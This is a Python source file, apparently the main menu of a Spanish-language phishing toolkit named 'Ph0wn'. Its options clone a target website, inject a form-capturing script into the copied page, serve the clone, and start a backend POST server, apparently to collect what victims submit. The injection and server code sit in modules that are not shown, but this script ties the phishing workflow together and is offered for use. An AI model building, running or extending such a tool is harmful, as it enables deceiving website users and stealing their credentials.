from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from create_phishing.utils_phishing import choose_index_item, choose_web
from create_phishing.create_form import create_form,inject_script
from create_phishing.clone_page import save_page
from server.socket import start_socket_web
from server.post_server import start_post_server
import pyfiglet
import os
import time

console = Console()

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    ascii_banner = pyfiglet.figlet_format("Ph0wn")
    console.print(ascii_banner, style="bold green")
    console.print('Powered by kikedev\n', style="bold green")

def menu():
    console.print(Panel.fit("1. Crear Phishing completo \n2. Seleccionar proyecto existente \n3. Desplegar Servicio Web \n4. Desplegar Servidor backend \n5. Salir", title="Menu", subtitle="Selecciona una opción", style="bold green"))

def create_phising(page,name_folder = None):
    project_path = save_page(page,name_folder)
    index_file = choose_index_item(project_path)
    config = create_form(os.path.join('www',project_path),index_file)
    inject_script(config,project_path,index_file)
    
def main():
    while True:
        clear_screen()
        banner()
        menu()
        opcion = Prompt.ask("\n[bold green]Elige una opción[/bold green]", choices=["1", "2", "3", "4", "5"], default="5")
        
        if opcion == "1":
            page = Prompt.ask("Introduce la página web a clonar")
            choose = Prompt.ask("¿Deseas algún nombre concreto para almacenar la web? (y/N)", default="N")
            
            if choose.lower() == "y":
                choose_name_folder = Prompt.ask("Introduce nombre para la carpeta")
            else:
                choose_name_folder = None

            create_phising(page, choose_name_folder)
            console.print("✅ Página almacenada correctamente\n", style="bold green")
        elif opcion == "2":
            project_path = choose_web()
            index_file = choose_index_item(project_path)
            config = create_form(os.path.join('www',project_path),index_file)
            inject_script(config,project_path,index_file)
        elif opcion == "3":
            project_deploy = choose_web()
            index_item = choose_index_item(project_deploy)
            start_socket_web(project_deploy,index_item)
            break
        elif opcion == "4":
            start_post_server()
            input("🕹️  Pulsa ENTER para detener el programa...\n")
            break
        elif opcion == "5":
            console.print("[bold red]Saliendo...[/bold red]")
            break
        
        console.print("\n[dim]Pulsa ENTER para continuar...[/dim]")
        input()

if __name__ == "__main__":
    main()
